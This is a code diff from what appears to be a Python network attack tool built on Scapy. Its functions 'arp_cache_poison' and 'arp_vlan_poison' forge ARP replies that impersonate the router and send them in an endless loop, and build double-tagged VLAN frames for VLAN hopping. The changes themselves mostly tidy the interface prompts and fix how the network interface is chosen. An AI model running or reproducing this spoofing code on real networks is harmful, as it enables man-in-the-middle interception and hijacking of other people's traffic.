@@ -53,17 +53,17 @@ def arp_cache_poison(iface=None, target_ip=None, router_ip=None, router_mac=None
         if iface is None:
             iface =  netifaces.interfaces()
             for i, ifaces in enumerate(iface, start=1):
-                print(f"{i}. {ifaces}")
-            iface_choice = int(input("Select interface: "))
+                console.print(f"[green]{i}. {ifaces}")
+            iface_choice = int(console.input("[yellow]Select interface: "))
 
-            iiface = ifaces[iface_choice - 1]
-            print("You chose:", iiface)
+            selected_iface = iface[iface_choice - 1]
+            print(f"You chose: {selected_iface}")
     except Exception as e:
         print(f"Var Exception Error: {e}"); return False 
      
     try:
         
-        pkt = Ether(dst=target_mac)/ARP(iface=iface, psrc=router_ip, pdst=target_ip_input)
+        pkt = Ether(dst=target_mac)/ARP(iface=selected_iface, psrc=router_ip, pdst=target_ip_input)
 
         sendp(pkt, inter=RandNum(10,40), loop=1)
 
@@ -74,7 +74,7 @@ def arp_cache_poison(iface=None, target_ip=None, router_ip=None, router_mac=None
 
 #Scapy ARP insertion under layer 2 protocol per VLAN
 def arp_vlan_poison():
-    target_ip = console.input("[yellow]| Enter Target IP:")
+    target_ip = console.input("[yellow]| Enter Target IP: ")
     target_mac = get_mac(target_ip)
 
     sendp(Ether(dst=target_mac)/Dot1Q(vlan=1)/Dot1Q(vlan=2)
